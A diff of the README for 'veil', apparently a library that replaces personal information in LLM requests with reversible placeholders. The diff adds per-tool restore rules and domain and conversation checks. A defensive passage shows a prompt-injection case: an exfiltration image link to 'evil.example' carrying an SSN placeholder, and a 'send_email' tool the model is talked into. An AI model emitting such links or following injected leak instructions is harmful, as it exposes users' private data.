@@ -2,8 +2,8 @@
 
 Reversible placeholders for personal information in what you send an LLM.
 
-The model sees `NAME_001`, `SSN_001` and `EMAIL_001`. Your tools get the real
-values back. The same person keeps the same placeholder for the whole
+The model sees `NAME_001`, `SSN_001` and `EMAIL_001`. The tools you name get
+the real values back. The same person keeps the same placeholder for the whole
 conversation, so the model can still reason about who is who.
 
 ```
@@ -53,7 +53,8 @@ import anthropic
 from veil import Redactor, FINANCE
 from veil.anthropic import wrap
 
-client = wrap(anthropic.Anthropic(), Redactor(FINANCE))     # one per conversation
+client = wrap(anthropic.Anthropic(), Redactor(FINANCE),    # one per conversation
+              restore={"add_member": "all"})               # the tools that get real values back
 client.redactor.add_person("Avery K. Mockridge")            # people you already know of
 client.redactor.add_business("Marlow Vane Growth Fund, LP") # names the model should keep seeing
 
@@ -64,6 +65,20 @@ You keep the conversation with the real values in it, as you would without
 veil. Each request goes out as a copy with placeholders in place of the real
 values. That covers what the user typed, tool results, the system prompt and
 the model's earlier turns, and also the tools' descriptions and `metadata`.
+Web search's `user_location` goes with only its country and timezone, so
+neither Anthropic nor the search provider learns the user's city or region
+(`user_location="send"` sends it all, `"drop"` sends none of it). A web
+search or fetch tool's `allowed_domains` and `blocked_domains` can't take
+placeholders, which would break the filter, so they are checked instead: a
+domain that holds anything veil would hide, an email domain from the
+conversation (not a mail service's, like gmail.com), or a known person's
+surname or whole name (`mockridge-law.com`, `averymockridge.com`) raises
+`DomainError` and nothing is sent. Pass `domains="send"` to send them as
+they are. A request
+that names `mcp_servers` raises `McpError` and nothing is sent: Anthropic calls
+those servers itself, so what they return would reach the model without
+placeholders. Pass `mcp_servers="send"` to let them, or call those tools
+yourself as your own tools, whose results veil redacts.
 In the reply, text and tool-call inputs come back with the real values
 (outside URLs: see [When text tells the model to leak](#when-text-tells-the-model-to-leak)).
 Thinking blocks, and the results of Anthropic's own tools, go back unchanged.
@@ -71,8 +86,28 @@ A content block of a kind veil doesn't know raises `BlockError`, and nothing
 is sent. Streaming isn't supported yet: `stream=True` raises an error, and so
 do `messages.stream`, `parse`, `batches`, `tool_runner`, the raw response
 forms and the legacy `completions`, which would otherwise send the request
-without placeholders. `client.with_options(...)` and `client.copy(...)` give a
-wrapped client for the same conversation.
+without placeholders. `client.with_options(...)`, `client.copy(...)` and
+`client.with_middleware(...)` give a wrapped client for the same conversation.
+Besides `messages`, the wrapped client offers only its settings (`api_key`,
+`timeout`, `aws_region` ...) and `models`. Anything else it would send without
+placeholders (`files`, `skills`, `beta.sessions`, `post` ...) raises
+`AttributeError`: call it on the client you wrapped if you mean to, knowing
+nothing sent through it is redacted.
+
+A redactor holds one conversation's real values, so it belongs to that
+conversation alone. The wrapper knows the conversation by its first message:
+a request that starts with a different one, through the same client or
+another client given the same redactor, raises `ConversationError` and
+nothing is sent, since one user's values could otherwise come back in
+another's conversation. Wrap a new client, or pass a new `Redactor`, for each
+conversation. An app that trims or rewrites the start of a conversation can
+pass `one_conversation=False`. Outside the wrapper, keeping one `Redactor` to
+one conversation is yours to do.
+
+An async client (`anthropic.AsyncAnthropic`, `AsyncAnthropicBedrock`,
+`AsyncAnthropicVertex`) is wrapped the same way, and `await
+client.messages.create(...)` works as usual. The redacting, and any file
+reading or guardrail check, runs in the event loop's thread.
 
 ## Images and PDFs
 
@@ -313,19 +348,22 @@ model writes  →  "Done for NAME_001. ![](https://evil.example/?d=SSN_001)"
 you get       →  "Done for Avery Mockridge. ![](https://evil.example/?d=SSN_001)"
 ```
 
-That doesn't stop a tool that sends things out from being handed real
-values. `restore` says which kinds each tool gets back, with `"*"` for any
-tool you don't name. A placeholder of any other kind reaches the tool as it is:
+Nor does a tool call get real values back unless you say it should.
+`restore` names the tools that do, and the kinds each gets (`"all"` for
+every kind, `"*"` for any tool you don't name). Any other tool gets the
+placeholders as the model wrote them, so a `send_email` the model was talked
+into sends `SSN_001`, not the number:
 
 ```python
 client = wrap(anthropic.Anthropic(), Redactor(FINANCE),
-              restore={"add_member": {"NAME", "SSN", "ADDRESS"},   # writes your own records
-                       "notify_member": {"EMAIL"},
-                       "*": set()})                                  # anything else: placeholders only
+              restore={"add_member": "all",                 # writes your own records
+                       "notify_member": {"EMAIL"}})         # anything else: placeholders only
 ```
 
-Without `restore`, every tool gets every kind back. If a tool needs real
-values inside a URL, pass `restore_urls=True`. Outside the wrapper,
+The first time a tool `restore` doesn't name is given placeholders, a warning
+says so, in case it should have been named. `restore="all"` gives every tool
+every kind, as before. If a tool needs real values inside a URL, pass
+`restore_urls=True`. Outside the wrapper,
 `r.restore_text(text, kinds={...}, urls=False)` and
 `r.restore(value, kinds=..., urls=False)` do the same.
 
@@ -434,7 +472,7 @@ own do, ask for a `Redactor` with the tagger beside its rules, one per conversat
 
 ```python
 r = TaggedRedactor().redactor(reveal={"DOB": "month"})
-client = wrap(anthropic.Anthropic(), r)                  # or r.redact_text(...) / r.restore_text(...)
+client = wrap(anthropic.Anthropic(), r, restore={"add_member": "all"})   # or r.redact_text(...) / r.restore_text(...)
 ```
 
 What the tagger marks is hidden where the rules hid nothing; a name of two words or more is then hidden
